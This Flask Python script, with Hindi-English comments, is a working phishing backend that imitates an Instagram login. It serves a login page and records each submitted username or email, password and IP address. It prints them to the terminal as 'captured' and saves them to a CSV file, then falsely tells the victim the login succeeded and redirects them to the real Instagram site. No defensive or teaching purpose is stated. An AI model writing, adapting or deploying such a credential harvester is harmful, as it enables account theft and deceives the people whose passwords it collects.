import os
import csv
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CSV_FILE = "instagram_logins.csv"

# Login ke baad user ko kahan bhejna hai
TARGET_REDIRECT_URL = "https://instagram.com/"

# Initialize CSV file with headers if missing
if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, mode="w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Timestamp", "Username_Or_Email", "Password", "IP_Address"])

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/api/login", methods=["POST"])
def handle_login():
    if request.is_json:
        data = request.get_json(silent=True) or {}
        username = data.get("username", "")
        password = data.get("password", "")
    else:
        username = request.form.get("username", "")
        password = request.form.get("password", "")

    username = str(username).strip()
    password = str(password).strip()

    # Validation
    if not username or not password:
        msg = "Error: Username aur Password bharna anivarya hai!"
        if request.is_json:
            return jsonify({"success": False, "message": msg}), 400
        return msg, 400

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    # 1. LIVE TERMINAL PRINT
    print("\n" + "=" * 55, flush=True)
    print(" 🚨 [INSTAGRAM LOGIN CAPTURED]", flush=True)
    print("=" * 55, flush=True)
    print(f" 👤 Username/Email : {username}", flush=True)
    print(f" 🔑 Password       : {password}", flush=True)
    print(f" 🌐 IP Address     : {client_ip}", flush=True)
    print(f" 🕒 Timestamp      : {timestamp}", flush=True)
    print("=" * 55 + "\n", flush=True)

    # 2. SAVE DATA TO CSV
    try:
        with open(CSV_FILE, mode="a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, username, password, client_ip])
    except Exception as e:
        print(f"❌ CSV Write Error: {e}", flush=True)

    # 3. Response handling
    if request.is_json:
        return jsonify({
            "success": True,
            "message": "Login successful!",
            "redirect_url": TARGET_REDIRECT_URL
        }), 200
    else:
        return redirect(TARGET_REDIRECT_URL)

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    print(f"\n⚡ Instagram Login Server running at http://127.0.0.1:{port}\n", flush=True)
    app.run(host="0.0.0.0", port=port, debug=True)
